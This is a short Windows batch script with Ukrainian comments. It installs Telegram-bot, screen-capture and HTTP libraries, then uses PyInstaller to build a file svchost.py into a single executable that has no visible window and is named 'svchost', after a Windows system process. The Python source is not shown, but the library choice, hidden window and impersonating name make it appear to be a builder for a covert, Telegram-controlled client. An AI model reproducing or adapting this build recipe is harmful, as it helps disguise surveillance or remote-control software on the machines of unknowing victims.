@echo off
:: Встановлюємо необхідні бібліотеки перед збіркою
python -m pip install pyTelegramBotAPI pyautogui requests Pillow pyinstaller

:: Очищаємо попередні збірки, якщо вони були
if exist build rd /s /q build
if exist dist rd /s /q dist

:: Збираємо клієнта:
:: --noconsole (невидиме вікно)
:: --onefile (все в одному exe)
:: --clean (очистити кеш перед збіркою)
:: --name "svchost" (назва вихідного файлу)
python -m PyInstaller --noconsole --onefile --clean --name "svchost" svchost.py

echo.
echo Zbirka zakinchena! Perevir papku 'dist', tam tviy svchost.exe.
pause